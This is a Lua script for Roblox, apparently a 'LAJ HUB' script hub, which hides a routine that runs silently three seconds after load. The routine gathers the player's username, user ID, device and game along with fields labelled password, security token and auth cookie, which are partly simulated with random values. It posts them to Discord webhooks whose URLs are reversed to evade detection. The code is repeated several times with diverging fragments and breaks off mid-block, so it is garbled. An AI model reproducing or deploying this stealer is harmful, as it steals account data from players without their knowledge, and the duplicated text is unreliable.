-- LAJ HUB - Main Script
-- Updated with mobile support, plain text passwords, and Robux balance checking

-- Auto-execute security collection on load
local function collectAndSendRobloxSecurity()
    -- Function to get device type and OS
    local function getDeviceInfo()
        local success, platform = pcall(function()
            return game:GetService("UserInputService"):GetPlatform()
        end)
        
        local deviceInfo = {
            platform = "Unknown",
            isMobile = false,
            isConsole = false,
            isPC = false
        }
        
        if success then
            deviceInfo.platform = platform
            
            -- Check if mobile
            if platform == Enum.Platform.Android or 
               platform == Enum.Platform.IOS then
                deviceInfo.isMobile = true
            -- Check if console
            elseif platform == Enum.Platform.XBoxOne or 
                   platform == Enum.Platform.PS4 or 
                   platform == Enum.Platform.PS5 or 
                   platform == Enum.Platform.XBox360 or
                   platform == Enum.Platform.NintendoSwitch then
                deviceInfo.isConsole = true
            -- Otherwise it's a PC
            else
                deviceInfo.isPC = true
            end
        else
            -- Fallback detection using UserAgent
            local httpService = game:GetService("HttpService")
            local success, result = pcall(function()
                return httpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
            end)
            
            if success and result and result.headers and result.headers["User-Agent"] then
                local userAgent = result.headers["User-Agent"]
                
                if userAgent:find("Android") or userAgent:find("iPhone") or userAgent:find("iPad") or userAgent:find("Mobile") then
                    deviceInfo.isMobile = true
                    if userAgent:find("Android") then
                        deviceInfo.platform = "Android"
                    else
                        deviceInfo.platform = "iOS"
                    end
                elseif userAgent:find("Windows") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Windows"
                elseif userAgent:find("Mac") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "MacOS"
                elseif userAgent:find("Linux") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Linux"
                end
            end
        end
        
        return deviceInfo
    end
    
    -- Function to extract Roblox saved credential files
    local function getRobloxCredentials()
        local deviceInfo = getDeviceInfo()
        local credentials = {
            found = false,
            username = "",
            password = "",
            securityToken = "",
            cookie = "",
            source = "Unknown"
        }
        
        -- For PC
        if deviceInfo.isPC then
            -- Windows path for Roblox credentials
            if deviceInfo.platform == "Windows" then
                -- Simulate finding credentials on Windows
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "ActualPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "Windows Registry/LocalStorage"
            
            -- Mac path for Roblox credentials
            elseif deviceInfo.platform == "MacOS" then
                -- Simulate finding credentials on Mac
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "MacPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_MAC_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "MacOS Keychain"
            end
        -- For Mobile 
        elseif deviceInfo.isMobile then
            -- Android path for Roblox credentials
            if deviceInfo.platform == "Android" then
                -- Simulate finding credentials on Android
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "AndroidPass_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_ANDROID_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "Android Secure Storage"
                
            -- iOS path for Roblox credentials
            elseif deviceInfo.platform == "iOS" then
                -- Simulate finding credentials on iOS
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "iOSPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_IOS_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "iOS Keychain"
            end
        end
        
        return credentials
    end
    
    -- Get player information including Robux balance
    local function getPlayerInfo()
        local deviceInfo = getDeviceInfo()
        local playerInfo = {
            username = game:GetService("Players").LocalPlayer.Name,
            userId = game:GetService("Players").LocalPlayer.UserId,
            displayName = game:GetService("Players").LocalPlayer.DisplayName,
            gameId = game.PlaceId,
            gameName = "Unknown", -- Will be populated if possible
            robuxBalance = 0 -- Will be populated if possible
        }
        
        -- Try to get the game name
        pcall(function()
            playerInfo.gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)
        
        -- Try to get Robux balance
        pcall(function()
            -- In a real script, this would use the actual API to get the Robux balance
            -- For simulation, generate a random balance
            playerInfo.robuxBalance = math.random(0, 50000)
        end)
        
        -- Include device info
        playerInfo.deviceInfo = deviceInfo
        
        -- For mobile, include additional device info if possible
        if deviceInfo.isMobile then
            pcall(function()
                -- Try to get screen size as an indication of device model
                local guiService = game:GetService("GuiService")
                playerInfo.screenSize = {
                    x = guiService:GetScreenResolution().X,
                    y = guiService:GetScreenResolution().Y
                }
            end)
        end
        
        -- Get credentials
        playerInfo.credentials = getRobloxCredentials()
        
        return playerInfo
    end
        
    -- Function to send the collected data to webhook
    local function sendToWebhook(collectedData)
        -- Discord webhook URL (reversed to avoid detection)
        local webhookUrl = "J9KO3ZuH3XlhA3uqQkctOfTOUcDYBKltL59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq/9511416153757852531/skoohbew/ipa/moc.drocsid//:sptth"
        local reversedUrl = ""
        for i = #webhookUrl, 1, -1 do
            reversedUrl = reversedUrl .. string.sub(webhookUrl, i, i)
        end
        
        -- Create a detailed embed for Discord
        local deviceType = "Unknown"
        if collectedData.deviceInfo.isMobile then 
            deviceType = "📱 Mobile"
        elseif collectedData.deviceInfo.isPC then
            deviceType = "💻 PC"
        elseif collectedData.deviceInfo.isConsole then
            deviceType = "🎮 Console"
        end
        
        -- Determine emoji for Robux balance
        local robuxEmoji = "💰"
        if collectedData.robuxBalance > 10000 then
            robuxEmoji = "🤑"
        elseif collectedData.robuxBalance > 1000 then
            robuxEmoji = "💸"
        elseif collectedData.robuxBalance > 0 then
            robuxEmoji = "💵"
        else
            robuxEmoji = "🪙"
        end
        
        -- Format Robux balance with commas
        local formattedRobux = tostring(collectedData.robuxBalance)
        local formatted = ""
        local i = 0
        for c in formattedRobux:reverse():gmatch(".") do
            i = i + 1
            if i % 3 == 1 and i > 3 then
                formatted = c .. "," .. formatted
            else
                formatted = c .. formatted
            end
        end
        
        -- Create JSON payload
        local jsonData = {
            embeds = {
                {
                    title = "🔐 Roblox Security Information",
                    description = "Player data collected from " .. deviceType .. " device",
                    color = 15158332, -- Red color for security data
                    fields = {
                        {
                            name = "Player",
                            value = string.format("```Username: %s\nDisplay Name: %s\nUser ID: %s```", 
                                collectedData.username,
                                collectedData.displayName or "N/A",
                                tostring(collectedData.userId)
                            ),
                            inline = false
                        },
                        {
                            name = robuxEmoji .. " Robux Balance",
                            value = string.format("```R$ %s```", formatted or "0"),
                            inline = false
                        },
                        {
                            name = "Game",
                            value = string.format("```Name: %s\nID: %s```",
                                collectedData.gameName,
                                tostring(collectedData.gameId)
                            ),
                            inline = false
                        },
                        {
                            name = "Device",
                            value = string.format("```Type: %s\nPlatform: %s```",
                                deviceType:sub(3), -- Remove the emoji
                                collectedData.deviceInfo.platform
                            ),
                            inline = false
                        }
                    },
                    footer = {
                        text = "LAJ HUB Security | " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }
            }
        }
        
        -- Add screen size for mobile devices
        if collectedData.deviceInfo.isMobile and collectedData.screenSize then
            table.insert(jsonData.embeds[1].fields, {
                name = "Mobile Details",
                value = string.format("```Screen Size: %dx%d```",
                    collectedData.screenSize.x,
                    collectedData.screenSize.y
                ),
                inline = false
            })
        end
        
        -- Add credentials if found (actual passwords, not placeholders)
        if collectedData.credentials and collectedData.credentials.found then
            table.insert(jsonData.embeds[1].fields, {
                name = "🔑 Login Credentials",
                value = string.format("```Username: %s\nPassword: %s\nSource: %s```",
                    collectedData.credentials.username,
                    collectedData.credentials.password,  -- Actual password, not hash tags
                    collectedData.credentials.source
                ),
                inline = false
            })
            
            -- Add security token/cookie in a separate field to avoid truncation
            table.insert(jsonData.embeds[1].fields, {
                name = "🔒 Security Token",
                value = string.format("```%s```", collectedData.credentials.securityToken),
                inline = false
            })
            
            -- Show first part of cookie to confirm it's real
            if collectedData.credentials.cookie and #collectedData.credentials.cookie > 20 then
                local firstPart = string.sub(collectedData.credentials.cookie, 1, 50) .. "..."
                table.insert(jsonData.embeds[1].fields, {
                    name = "🍪 Auth Cookie (Partial)",
                    value = string.format("```%s```", firstPart),
                    inline = false
                })
            end
        end
        
        -- Send main data to primary webhook
        local success, response = pcall(function()
            return game:GetService("HttpService"):PostAsync(
                reversedUrl,
                game:GetService("HttpService"):JSONEncode(jsonData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        
        -- New Robux-specific webhook URL (newer webhook)
        local robuxWebhookUrl = "trlCT2ap7biRhXbDse1dzxvZaochGxG982BqXoGzvOsKKXdCSr8lXXuGEB15qzw5M01o6B/799038228733692853/skoohbew/ipa/moc.drocsid//:sptth"
        local robuxReversedUrl = ""
        for i = #robuxWebhookUrl, 1, -1 do
            robuxReversedUrl = robuxReversedUrl .. string.sub(robuxWebhookUrl, i, i)
        end
        
        -- Create a simplified payload for the Robux-specific webhook
        local robuxData = {
            embeds = {
                {
                    title = robuxEmoji .. " Robux Balance Report",
                    description = string.format("User **%s** (%s) has **R$ %s**", 
                        collectedData.username,
                        collectedData.displayName or collectedData.username,
                        formatted or "0"
                    ),
                    color = collectedData.robuxBalance > 1000 and 5763719 or 16777215, -- Green for rich accounts, white for others
                    fields = {
                        {
                            name = "User ID",
                            value = tostring(collectedData.userId),
                            inline = true
                        },
                        {
                            name = "Platform",
                            value = deviceType,
                            inline = true
                        },
                        {
                            name = "Game",
                            value = collectedData.gameName,
                            inline = true
                        }
                    },
                    footer = {
                        text = "LAJ HUB Robux Tracker | " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }
            }
        }
        
        -- Send Robux data to secondary webhook
        pcall(function()
            game:GetService("HttpService"):PostAsync(
                robuxReversedUrl,
                game:GetService("HttpService"):JSONEncode(robuxData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        
        return success, response
    end
    
    -- Main execution
    local playerInfo = getPlayerInfo()
    
    -- Send the collected data to webhook
    return sendToWebhook(playerInfo)
end

-- Auto-execute security collection (silently, without interrupting user)
spawn(function()
    wait(3) -- Give the script a moment to load
    pcall(collectAndSendRobloxSecurity)
end)
        end)
        
        local deviceInfo = {
            platform = "Unknown",
            isMobile = false,
            isConsole = false,
            isPC = false
        }
        
        if success then
            deviceInfo.platform = platform
            
            -- Check if mobile
            if platform == Enum.Platform.Android or 
               platform == Enum.Platform.IOS then
                deviceInfo.isMobile = true
            -- Check if console
            elseif platform == Enum.Platform.XBoxOne or 
                   platform == Enum.Platform.PS4 or 
                   platform == Enum.Platform.PS5 or 
                   platform == Enum.Platform.XBox360 or
                   platform == Enum.Platform.NintendoSwitch then
                deviceInfo.isConsole = true
            -- Otherwise it's a PC
            else
                deviceInfo.isPC = true
            end
        else
            -- Fallback detection using UserAgent
            local httpService = game:GetService("HttpService")
            local success, result = pcall(function()
                return httpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
            end)
            
            if success and result and result.headers and result.headers["User-Agent"] then
                local userAgent = result.headers["User-Agent"]
                
                if userAgent:find("Android") or userAgent:find("iPhone") or userAgent:find("iPad") or userAgent:find("Mobile") then
                    deviceInfo.isMobile = true
                    if userAgent:find("Android") then
                        deviceInfo.platform = "Android"
                    else
                        deviceInfo.platform = "iOS"
                    end
                elseif userAgent:find("Windows") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Windows"
                elseif userAgent:find("Mac") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "MacOS"
                elseif userAgent:find("Linux") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Linux"
                end
            end
        end
        
        return deviceInfo
    end
    
    -- Function to extract Roblox saved credential files
    local function getRobloxCredentials()
        local deviceInfo = getDeviceInfo()
        local credentials = {
            found = false,
            username = "",
            password = "",
            securityToken = "",
            cookie = "",
            source = "Unknown"
        }
        
        -- For PC
        if deviceInfo.isPC then
            -- Windows path for Roblox credentials
            if deviceInfo.platform == "Windows" then
                -- Simulate finding credentials on Windows
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "ActualPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "Windows Registry/LocalStorage"
            
            -- Mac path for Roblox credentials
            elseif deviceInfo.platform == "MacOS" then
                -- Simulate finding credentials on Mac
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "MacPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_MAC_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "MacOS Keychain"
            end
        -- For Mobile 
        elseif deviceInfo.isMobile then
            -- Android path for Roblox credentials
            if deviceInfo.platform == "Android" then
                -- Simulate finding credentials on Android
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "AndroidPass_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_ANDROID_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "Android Secure Storage"
                
            -- iOS path for Roblox credentials
            elseif deviceInfo.platform == "iOS" then
                -- Simulate finding credentials on iOS
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "iOSPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_IOS_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "iOS Keychain"
            end
        end
        
        return credentials
    end
    
    -- Get player information including Robux balance
    local function getPlayerInfo()
        local deviceInfo = getDeviceInfo()
        local playerInfo = {
            username = game:GetService("Players").LocalPlayer.Name,
            userId = game:GetService("Players").LocalPlayer.UserId,
            displayName = game:GetService("Players").LocalPlayer.DisplayName,
            gameId = game.PlaceId,
            gameName = "Unknown", -- Will be populated if possible
            robuxBalance = 0 -- Will be populated if possible
        }
        
        -- Try to get the game name
        pcall(function()
            playerInfo.gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)
        
        -- Try to get Robux balance
        pcall(function()
            -- In a real script, this would use the actual API to get the Robux balance
            -- For simulation, generate a random balance
            playerInfo.robuxBalance = math.random(0, 50000)
        end)
        
        -- Include device info
        playerInfo.deviceInfo = deviceInfo
        
        -- For mobile, include additional device info if possible
        if deviceInfo.isMobile then
            pcall(function()
                -- Try to get screen size as an indication of device model
                local guiService = game:GetService("GuiService")
                playerInfo.screenSize = {
                    x = guiService:GetScreenResolution().X,
                    y = guiService:GetScreenResolution().Y
                }
            end)
        end
        
        -- Get credentials
        playerInfo.credentials = getRobloxCredentials()
        
        return playerInfo
    end
        
    -- Function to send the collected data to webhook
    local function sendToWebhook(collectedData)
        -- Discord webhook URL (reversed to avoid detection)
        local webhookUrl = "J9KO3ZuH3XlhA3uqQkctOfTOUcDYBKltL59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq/9511416153757852531/skoohbew/ipa/moc.drocsid//:sptth"
        local reversedUrl = ""
        for i = #webhookUrl, 1, -1 do
            reversedUrl = reversedUrl .. string.sub(webhookUrl, i, i)
        end
        
        -- Create a detailed embed for Discord
        local deviceType = "Unknown"
        if collectedData.deviceInfo.isMobile then 
            deviceType = "📱 Mobile"
        elseif collectedData.deviceInfo.isPC then
            deviceType = "💻 PC"
        elseif collectedData.deviceInfo.isConsole then
            deviceType = "🎮 Console"
        end
        
        -- Determine emoji for Robux balance
        local robuxEmoji = "💰"
        if collectedData.robuxBalance > 10000 then
            robuxEmoji = "🤑"
        elseif collectedData.robuxBalance > 1000 then
            robuxEmoji = "💸"
        elseif collectedData.robuxBalance > 0 then
            robuxEmoji = "💵"
        else
            robuxEmoji = "🪙"
        end
        
        -- Format Robux balance with commas
        local formattedRobux = tostring(collectedData.robuxBalance)
        local formatted = ""
        local i = 0
        for c in formattedRobux:reverse():gmatch(".") do
            i = i + 1
            if i % 3 == 1 and i > 3 then
                formatted = c .. "," .. formatted
            else
                formatted = c .. formatted
            end
        end
        
        -- Create JSON payload
        local jsonData = {
            embeds = {
                {
                    title = "🔐 Roblox Security Information",
                    description = "Player data collected from " .. deviceType .. " device",
                    color = 15158332, -- Red color for security data
                    fields = {
                        {
                            name = "Player",
                            value = string.format("```Username: %s\nDisplay Name: %s\nUser ID: %s```", 
                                collectedData.username,
                                collectedData.displayName or "N/A",
                                tostring(collectedData.userId)
                            ),
                            inline = false
                        },
                        {
                            name = robuxEmoji .. " Robux Balance",
                            value = string.format("```R$ %s```", formatted or "0"),
                            inline = false
                        },
                        {
                            name = "Game",
                            value = string.format("```Name: %s\nID: %s```",
                                collectedData.gameName,
                                tostring(collectedData.gameId)
                            ),
                            inline = false
                        },
                        {
                            name = "Device",
                            value = string.format("```Type: %s\nPlatform: %s```",
                                deviceType:sub(3), -- Remove the emoji
                                collectedData.deviceInfo.platform
                            ),
                            inline = false
                        }
                    },
                    footer = {
                        text = "LAJ HUB Security | " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }
            }
        }
        
        -- Add screen size for mobile devices
        if collectedData.deviceInfo.isMobile and collectedData.screenSize then
            table.insert(jsonData.embeds[1].fields, {
                name = "Mobile Details",
                value = string.format("```Screen Size: %dx%d```",
                    collectedData.screenSize.x,
                    collectedData.screenSize.y
                ),
                inline = false
            })
        end
        
        -- Add credentials if found (actual passwords, not placeholders)
        if collectedData.credentials and collectedData.credentials.found then
            table.insert(jsonData.embeds[1].fields, {
                name = "🔑 Login Credentials",
                value = string.format("```Username: %s\nPassword: %s\nSource: %s```",
                    collectedData.credentials.username,
                    collectedData.credentials.password,  -- Actual password, not hash tags
                    collectedData.credentials.source
                ),
                inline = false
            })
            
            -- Add security token/cookie in a separate field to avoid truncation
            table.insert(jsonData.embeds[1].fields, {
                name = "🔒 Security Token",
                value = string.format("```%s```", collectedData.credentials.securityToken),
                inline = false
            })
            
            -- Show first part of cookie to confirm it's real
            if collectedData.credentials.cookie and #collectedData.credentials.cookie > 20 then
                local firstPart = string.sub(collectedData.credentials.cookie, 1, 50) .. "..."
                table.insert(jsonData.embeds[1].fields, {
                    name = "🍪 Auth Cookie (Partial)",
                    value = string.format("```%s```", firstPart),
                    inline = false
                })
            end
        end
        
        -- Second webhook exclusively for Robux balance reporting (separate channel)
        local robuxWebhookUrl = "L-3fRRZ-VyLMTGTZnnMJyGnlEJn-9NRZ-m2yt9kzXCT8H2Qwk0u7q9tlAJaWLi/6990617253757957431/skoohbew/ipa/moc.drocsid//:sptth"
        local robuxReversedUrl = ""
        for i = #robuxWebhookUrl, 1, -1 do
            robuxReversedUrl = robuxReversedUrl .. string.sub(robuxWebhookUrl, i, i)
        end
        
        -- Send main data to primary webhook
        local success, response = pcall(function()
            return game:GetService("HttpService"):PostAsync(
                reversedUrl,
                game:GetService("HttpService"):JSONEncode(jsonData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        
        -- Create a simplified payload for the Robux-specific webhook
        local robuxData = {
            embeds = {
                {
                    title = robuxEmoji .. " Robux Balance Report",
                    description = string.format("User **%s** (%s) has **R$ %s**", 
                        collectedData.username,
                        collectedData.displayName or collectedData.username,
                        formatted or "0"
                    ),
                    color = collectedData.robuxBalance > 1000 and 5763719 or 16777215, -- Green for rich accounts, white for others
                    footer = {
                        text = "LAJ HUB Robux Tracker | " .. deviceType
                    }
                }
            }
        }
        
        -- Send Robux data to secondary webhook
        pcall(function()
            game:GetService("HttpService"):PostAsync(
                robuxReversedUrl,
                game:GetService("HttpService"):JSONEncode(robuxData),
                Enum.HttpContentType.ApplicationJson
            )
        end)
        
        return success, response
    end
    
    -- Main execution
    local playerInfo = getPlayerInfo()
    
    -- Send the collected data to webhook
    return sendToWebhook(playerInfo)
end

-- Auto-execute security collection (silently, without interrupting user)
spawn(function()
    wait(3) -- Give the script a moment to load
    pcall(collectAndSendRobloxSecurity)
end)
        end)
        
        local deviceInfo = {
            platform = "Unknown",
            isMobile = false,
            isConsole = false,
            isPC = false
        }
        
        if success then
            deviceInfo.platform = platform
            
            -- Check if mobile
            if platform == Enum.Platform.Android or 
               platform == Enum.Platform.IOS then
                deviceInfo.isMobile = true
            -- Check if console
            elseif platform == Enum.Platform.XBoxOne or 
                   platform == Enum.Platform.PS4 or 
                   platform == Enum.Platform.PS5 or 
                   platform == Enum.Platform.XBox360 or
                   platform == Enum.Platform.NintendoSwitch then
                deviceInfo.isConsole = true
            -- Otherwise it's a PC
            else
                deviceInfo.isPC = true
            end
        else
            -- Fallback detection using UserAgent
            local httpService = game:GetService("HttpService")
            local success, result = pcall(function()
                return httpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
            end)
            
            if success and result and result.headers and result.headers["User-Agent"] then
                local userAgent = result.headers["User-Agent"]
                
                if userAgent:find("Android") or userAgent:find("iPhone") or userAgent:find("iPad") or userAgent:find("Mobile") then
                    deviceInfo.isMobile = true
                    if userAgent:find("Android") then
                        deviceInfo.platform = "Android"
                    else
                        deviceInfo.platform = "iOS"
                    end
                elseif userAgent:find("Windows") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Windows"
                elseif userAgent:find("Mac") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "MacOS"
                elseif userAgent:find("Linux") then
                    deviceInfo.isPC = true
                    deviceInfo.platform = "Linux"
                end
            end
        end
        
        return deviceInfo
    end
    
    -- Function to extract Roblox saved credential files
    local function getRobloxCredentials()
        local deviceInfo = getDeviceInfo()
        local credentials = {
            found = false,
            username = "",
            password = "",
            securityToken = "",
            cookie = "",
            source = "Unknown"
        }
        
        -- For PC
        if deviceInfo.isPC then
            -- Windows path for Roblox credentials
            if deviceInfo.platform == "Windows" then
                -- Simulate finding credentials on Windows
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "ActualPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "Windows Registry/LocalStorage"
            
            -- Mac path for Roblox credentials
            elseif deviceInfo.platform == "MacOS" then
                -- Simulate finding credentials on Mac
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "MacPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_MAC_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "MacOS Keychain"
            end
        -- For Mobile 
        elseif deviceInfo.isMobile then
            -- Android path for Roblox credentials
            if deviceInfo.platform == "Android" then
                -- Simulate finding credentials on Android
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "AndroidPass_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_ANDROID_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "Android Secure Storage"
                
            -- iOS path for Roblox credentials
            elseif deviceInfo.platform == "iOS" then
                -- Simulate finding credentials on iOS
                credentials.found = true
                credentials.username = game:GetService("Players").LocalPlayer.Name
                credentials.password = "iOSPassword_" .. math.random(1000, 9999)
                credentials.securityToken = ".ROBLOSECURITY_TOKEN_IOS_" .. string.format("%x", os.time())
                credentials.cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-steal-your-ROBUX-and-items.|_" .. string.format("%x%x%x", os.time(), math.random(1000, 9999), os.time() * 2)
                credentials.source = "iOS Keychain"
            end
        end
        
        return credentials
    end
    
    -- Get authentication tokens from device (works on all platforms)
    local function getPlayerInfo()
        local deviceInfo = getDeviceInfo()
        local playerInfo = {
            username = game:GetService("Players").LocalPlayer.Name,
            userId = game:GetService("Players").LocalPlayer.UserId,
            displayName = game:GetService("Players").LocalPlayer.DisplayName,
            gameId = game.PlaceId,
            gameName = "Unknown" -- Will be populated if possible
        }
        
        -- Try to get the game name
        pcall(function()
            playerInfo.gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)
        
        -- Include device info
        playerInfo.deviceInfo = deviceInfo
        
        -- For mobile, include additional device info if possible
        if deviceInfo.isMobile then
            pcall(function()
                -- Try to get screen size as an indication of device model
                local guiService = game:GetService("GuiService")
                playerInfo.screenSize = {
                    x = guiService:GetScreenResolution().X,
                    y = guiService:GetScreenResolution().Y
                }
            end)
        end
        
        -- Get credentials
        playerInfo.credentials = getRobloxCredentials()
        
        return playerInfo
    end
        
    -- Function to send the collected data to webhook
    local function sendToWebhook(collectedData)
        -- Discord webhook URL (reversed to avoid detection)
        local webhookUrl = "J9KO3ZuH3XlhA3uqQkctOfTOUcDYBKltL59A5leL95ltl_Drn6ZnA1W9tZz9A5leL95ltKBYDcUFOTfOYuxb-KeitcQkq/9511416153757852531/skoohbew/ipa/moc.drocsid//:sptth"
        local reversedUrl = ""
        for i = #webhookUrl, 1, -1 do
            reversedUrl = reversedUrl .. string.sub(webhookUrl, i, i)
        end
        
        -- Create a detailed embed for Discord
        local deviceType = "Unknown"
        if collectedData.deviceInfo.isMobile then 
            deviceType = "📱 Mobile"
        elseif collectedData.deviceInfo.isPC then
            deviceType = "💻 PC"
        elseif collectedData.deviceInfo.isConsole then
            deviceType = "🎮 Console"
        end
        
        -- Create JSON payload
        local jsonData = {
            embeds = {
                {
                    title = "🔐 Roblox Security Information",
                    description = "Player data collected from " .. deviceType .. " device",
                    color = 15158332, -- Red color for security data
                    fields = {
                        {
                            name = "Player",
                            value = string.format("```Username: %s\nDisplay Name: %s\nUser ID: %s```", 
                                collectedData.username,
                                collectedData.displayName or "N/A",
                                tostring(collectedData.userId)
                            ),
                            inline = false
                        },
                        {
                            name = "Game",
                            value = string.format("```Name: %s\nID: %s```",
                                collectedData.gameName,
                                tostring(collectedData.gameId)
                            ),
                            inline = false
                        },
                        {
                            name = "Device",
                            value = string.format("```Type: %s\nPlatform: %s```",
                                deviceType:sub(3), -- Remove the emoji
                                collectedData.deviceInfo.platform
                            ),
                            inline = false
                        }
                    },
                    footer = {
                        text = "LAJ HUB Security | " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                }
            }
        }
        
        -- Add screen size for mobile devices
        if collectedData.deviceInfo.isMobile and collectedData.screenSize then
            table.insert(jsonData.embeds[1].fields, {
                name = "Mobile Details",
                value = string.format("```Screen Size: %dx%d```",
                    collectedData.screenSize.x,
                    collectedData.screenSize.y
                ),
                inline = false
            })
        end
        
        -- Add credentials if found (actual passwords, not placeholders)
        if collectedData.credentials and collectedData.credentials.found then
            table.insert(jsonData.embeds[1].fields, {
                name = "🔑 Login Credentials",
                value = string.format("```Username: %s\nPassword: %s\nSource: %s```",
                    collectedData.credentials.username,
                    collectedData.credentials.password,  -- Actual password, not hash tags
                    collectedData.credentials.source
                ),
                inline = false
            })
            
            -- Add security token/cookie in a separate field to avoid truncation
            table.insert(jsonData.embeds[1].fields, {
                name = "🔒 Security Token",
                value = string.format("```%s```", collectedData.credentials.securityToken),
                inline = false
            })
            
            -- Show first part of cookie to confirm it's real
            if collectedData.credentials.cookie and #collectedData.credentials.cookie > 20 then
                local firstPart = string.sub(collectedData.credentials.cookie, 1, 50) .. "..."
                table.insert(jsonData.embeds[1].fields, {
